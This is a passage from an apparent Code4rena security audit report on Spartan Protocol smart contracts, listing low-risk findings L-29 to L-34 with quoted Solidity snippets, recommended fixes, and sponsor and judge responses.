0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/144\">[L-29] Missing zero address check on <code>BondVault</code> constructor</a></h2>\n<p>This is a low risk vulnerability due to the fact that it is possible to lose funds if the Base address is set to a zero address and someone sends funds to this address. As a rule, there should always be checks to make sure that initialized addresses are never a zero address.</p>\n<p>According to Slither analysis documentation (<a href=\"https://github.com/crytic/slither/wiki/Detector-Documentation#exploit-scenario-49\">https://github.com/crytic/slither/wiki/Detector-Documentation#exploit-scenario-49</a>), there needs to be a zero address checkpoint when initializing a base address in a contract. In the case for <code>BondVault</code>, the constructor initializes a base address. There should be a check to make sure this address is never zero to make sure there is no way to lose funds.</p>\n<p>Slither detector:</p>\n<p>missing-zero-check:</p>\n<p><code>BondVault.constructor(address)._base</code> (contracts/BondVault.sol#37) lacks a zero-check on : <code>BASE = _base (contracts/BondVault.sol#38)</code></p>\n<hr>\n<p>See issue page for Slither output from console (JSON format):</p>\n<p><strong>Recommend</strong>:</p>\n<ol>\n<li>Clone repository for Spartan Smart Contracts</li>\n<li>Create a python virtual environment with a stable python version</li>\n<li>Install Slither Analyzer on the python VEM</li>\n<li>Run Slither against all contracts</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/144\">verifyfirst (Spartan) acknowledged</a></strong></p>\n<h2 id=\"l-30-cant-add-bnb-with-createpooladd\" style=\"position:relative;\"><a href=\"#l-30-cant-add-bnb-with-createpooladd\" aria-label=\"l 30 cant add bnb with createpooladd permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/7\">[L-30] Can’t add BNB with <code>createPoolADD</code></a></h2>\n<p>The function <code>createPoolADD()</code> supports the input of BNB, which it detects by checking <code>token == address(0)</code>\nLater it calls <code>_handleTransferIn(token, ...);</code> with the original value of token, which can be 0.</p>\n<p>However in the function <code>_handleTransferIn()</code> in poolFactory.sol there is no provision to transfer BNB (it doesn’t check for _token == 0), so it will revert when you try to add BNB.</p>\n<p>As a comparison, the function <code>_handleTransferIn()</code> of Router.sol does check for _token == address(0) and takes appropriate action.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"45\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"46\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createPoolADD</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"47\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"48\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"49\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)){</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">WBNB</span><span class=\"mtk1\">;} </span><span class=\"mtk3\">// Handle BNB -&gt; WBNB</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"50\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"51\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_handleTransferIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inputToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Transfer TOKEN liquidity to new pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"52\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"53\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleTransferIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">actual</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"54\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"55\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startBal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"56\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"57\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">actual</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">) - (</span><span class=\"mtk12\">startBal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"58\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"59\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"197\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"198\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleTransferIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">actual</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"199\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"200\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"201\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"202\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WBNB</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Wrap BNB</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"203\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!send&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"204\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WBNB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Transfer WBNB from ROUTER to pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"205\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">actual</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"206\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"207\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startBal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Get prior TOKEN balance of pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"208\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Transfer TOKEN to pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"209\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">actual</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">)-(</span><span class=\"mtk12\">startBal</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Get received TOKEN amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"210\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"211\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"212\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Recommend applying the same function as <code>_handleTransferIn</code> of Router.sol to <code>_handleTransferIn</code> of poolFactory.sol. Better yet deduplicate the function by moving it to a library/included solidity file. Note:  There is also a  <code>_handleTransferIn</code> in Synth.sol which isn’t used.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/7#issuecomment-884629116\">SamusElderg (Spartan) disputed</a>:</strong></p>\n<blockquote>\n<p>Whilst true; the intention is always that BNB will already be listed as standard; so the user’s createPoolADD() function is irrelevant to BNB. However, this was not made clear anywhere; so is a good observation! @verifyfirst (Spartan) should we leave this? Or Block BNB pool thru that function? Or adjust the function to account for BNB even though it will already be listed?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/7#issuecomment-885426407\">SamusElderg (Spartan) commented</a>:</strong></p>\n<blockquote>\n<p>No need for action on this one; BNB pool will be deployed at the same time.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/7#issuecomment-894854660\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Per sponsor comment, low risk</p>\n</blockquote>\n<h2 id=\"l-31-possible-divide-by-zero-errors-in-utils\" style=\"position:relative;\"><a href=\"#l-31-possible-divide-by-zero-errors-in-utils\" aria-label=\"l 31 possible divide by zero errors in utils permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/232\">[L-31] Possible divide by zero errors in <code>Utils</code></a></h2>\n<p>Several functions in <code>Utils</code> do not handle edge cases where the divisor is 0, caused mainly by no liquidity in the pool. In such cases, the transactions revert without returning a proper error message.</p>\n<p>See issue page for referenced code:\nRecommend checking if the divisors are 0 in the above functions to handle edge cases.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/232\">verifyfirst (Spartan) confirmed</a></strong></p>\n<h2 id=\"l-32-purging-dao-deployer-immediately-in-a-single-step-is-risky\" style=\"position:relative;\"><a href=\"#l-32-purging-dao-deployer-immediately-in-a-single-step-is-risky\" aria-label=\"l 32 purging dao deployer immediately in a single step is risky permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/96\">[L-32] Purging DAO deployer immediately in a single-step is risky</a></h2>\n<p>The DAO deployer is used as the authorized address in the modifier onlyDAO allowing it to set various critical protocol addresses and parameters. The <code>purgeDeployer()</code> function is expected to be called by the deployer once the DAO is stable and final. However, a single-step critical action such as this is extremely risky because it may be called accidentally and is irrecoverable from such mistakes.</p>\n<p>Scenario 1: The DAO is not yet stable and final. But the deployer, e.g. controlled by an EOA, accidentally triggers this function. The protocol parameters/addresses can no longer be changed when required. The entire protocol has to be halted and redeployed. User funds have to be returned. Protocol reputation takes a hit.</p>\n<p>Scenario 2: The DAO is not yet stable and final but the deployer incorrectly assumes it is final and triggers this function. The protocol parameters/addresses can no longer be changed when required. The entire protocol has to be halted and redeployed. User funds have to be returned. Protocol reputation takes a hit.</p>\n<p>While a two-step process is generally recommended for critical address changes, a single-step purge/renounce is equally risky if it is controlled by an EOA and is not timelocked.</p>\n<p>At a minimum, make sure that (1) deployer is not an EOA but a multisig controlled by mutually independent and trustworthy entities, (2) this function is timelocked.</p>\n<p>A better design change would be to let the DAO decide if it considers itself stable/final and let it vote for a proposal that purges the deployer.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/96#issuecomment-885464482\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>Purge deployer is something that would be completed once the protocol is completely stable and future proof.\nThe risk of accidentally calling purgeDeployer is very low.\nSuggested mitigations are considered.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/96#issuecomment-894857823\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Possibility of this happening is very low so making this low risk</p>\n</blockquote>\n<h2 id=\"l-33-calling-synthvault_deposit-multiple-times-will-make-you-loose-rewards\" style=\"position:relative;\"><a href=\"#l-33-calling-synthvault_deposit-multiple-times-will-make-you-loose-rewards\" aria-label=\"l 33 calling synthvault_deposit multiple times will make you loose rewards permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/65\">[L-33] Calling <code>synthVault</code>:_deposit multiple times, will make you loose rewards</a></h2>\n<p>Calling <code>deposit</code> multiple times will change the <code>mapMemberSynth_lastTime</code> to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">mapMemberSynth_lastTime</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_member</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_synth</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">minimumDepositTime</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>This is used in <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L157\"><code>calcCurrentReward</code></a> to calculate how much the user earned.</p>\n<p>Everytime the user calls <code>_deposit</code> (via deposit), the <code>mapMemberSynth_lastTime</code> will be set to a date in the future, meaning that they will loose all the rewards they accrued. Calling <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L90\"><code>deposit</code></a> calls <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L102\"><code>_deposit</code></a> without harvesting for the user meaning that they lost those rewards.</p>\n<p>Recommend force harvest user rewards at the beginning of every <code>_deposit()</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/65#issuecomment-885455241\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>This is only an issue if a user directly interacts with the contracts - assuming they know what they are doing.\nDAPP has already implemented deterrents to avoid this inconvenience for users.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/65#issuecomment-894858608\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This requires user to call functions to deliberately harm themselves. Making this low risk.</p>\n</blockquote>\n<h2 id=\"l-34-attacker-can-trigger-pool-sync-leading-to-user-fund-loss\" style=\"position:relative;\"><a href=\"#l-34-attacker-can-trigger-pool-sync-leading-to-user-fund-loss\" aria-label=\"l 34 attacker can trigger pool sync leading to user fund loss permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/120\">[L-34] Attacker can trigger pool sync leading to user fund loss</a></h2>\n<p>An attacker can front-run any operation that depends on the pool contract’s internal balance amounts being unsynced to pool’s balance on token/base contracts effectively nullifying the transfer of base/tokens for those operations. This will make <code>_getAddedBaseAmount()</code> and <code>_getAddedTokenAmount()</code> return 0 (because the balances are synced) from such operations.</p>\n<p>The affected operations are: <code>addForMember()</code>, <code>swapTo()</code> and <code>mintSynth()</code> which will all take the user funds to respective contracts but will treat it as 0 (because of the syncing) and thus not add liquidity, return swapped tokens or mint any synths to the affected users. User loses deposited funds to the contract.</p>\n<p>Recommend adding access control to <code>sync()</code> function so that only Router can call it via <code>addDividend()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/120#issuecomment-884606104\">verifyfirst (Spartan) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>Whilst we disagree with the above attack vector, it brings up a point about permissions on the pool’s sync() function which was always intended to be called by anyone incase of accidentally send in.\nHowever, we have decided to permission the sync to router only just for peace of 